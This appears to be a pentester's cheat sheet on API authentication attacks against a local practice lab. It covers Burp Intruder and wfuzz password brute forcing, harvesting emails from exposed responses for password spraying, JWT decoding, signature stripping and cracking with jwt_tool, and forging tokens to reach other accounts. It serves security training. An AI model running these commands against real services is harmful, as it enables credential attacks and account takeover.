# Classic Authentication Attacks

## Burp Suite Intruder
1. Capture login request and send it to Intruder.
2. Add fuzzing positions.
3. Select Cluster Bomb attack type to test all combinations.
4. Add payload sets 
5. Start attack and look for anomaly in status code, response length, response time, etc.

## Wfuzz Bruteforce/Dictionaty Attack
     wfuzz -d '{"email":"a@email.com","password":"FUZZ"}' -H 'Content-Type: application/json' -z file,/usr/share/wordlists/rockyou.txt -u http://127.0.0.1:8888/identity/api/auth/login --hc 405

## Using Excessive Data Exposure to get usernames and try Password Spraying
1. If excessive data exposure is found in any responses, select "Save Response to File"
2. Try to grep strings that match email requirements. 
    
        grep -oe "[a-zA-Z0-9._]\+@[a-zA-Z]\+.[a-zA-Z]\+" response.json
3. This will remove any duplicates and save it to a file
  
       grep -oe "[a-zA-Z0-9._]\+@[a-zA-Z]\+.[a-zA-Z]\+" response.json | sort -u > unames

4. Use this username list in Intruder attack (**Cluster Bomb mode**) with a password list that matches bare minimum of password requirements. 
5. Start an attack and observe results being generated.


# API Token Attacks
## Analyse the randomness of Tokens being generated 
1. Capture a valid login request nad send it to Sequencer.
2. In Custom Location options specify the token location in request body
3. Start live capture and analyse the randomness of tokens

## JWT Analysis
**JWT.io**
1. Copy the token 
2. JWT cosists of 3 parts - header.payload.signature

        eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ0ZXN0ZXJAdGVzdC5jb20iLCJyb2xlIjoidXNlciIsImlhdCI6MTcxMjI5NDg4OSwiZXhwIjoxNzEyODk5Njg5fQ.fu0ELPPtszoh4b_DsynsHhbGuVowtZtMiQjTDMP7_bfMh9avBN0Yjx4rBYGlYBV78Ze6Fc_rPkzUyyGsYzOUipd_2HNDj5Tz3SgCWnQh0fca2SkqkNXSRgu9pARvA4favPWyTtGX4alF5AgJCwoIEUtUoz86DEkOwEt7QV6wqnVS3Y-OAxkmOqVdV5yD9UEBHg1DjWrMfcB40M0MufrvVYr2RyhoypFfOG_VKD56lx8FfyuoCq52HizCZVfsBZC4HYOwA-gl3xjzpL_Fb2d1A8g2-6E2aTxcdF7wR1FDFQvRFuCs4-0LrCavysgrf--tUWdlBIQC5w_8qVNKisSABg
3. Use tool like jwt.io to have a better look at JWT.
 
**echo**
copy a single part of jwt and try to base64 decode it.
    
        echo <> | base64 -d

**jwt_tool**
1. this will give similar results to how jwt.io returns data about the jwt
    
        jwt_tool <token>
2. check different modes with -M
3. Try removing signature with -X a 
4. To try and crack the signature, 
    1. generate a wordlist with crunch
        
            crunch 5 5 -o pw.txt
    2. try cracking with Crack option in jwt tool
            
            jwt_tool <token> -C -d pw.txt
> depending on the key length we would need to generate a wordlist for cracking the signature
5. Lets say we did crack a signature and got the key.
6. Now we can try to get access to another account by replacing the email id in JWT payload section on jwt.io and adding the signature value in signature section 
7. this will result in unauthorized access to another account.
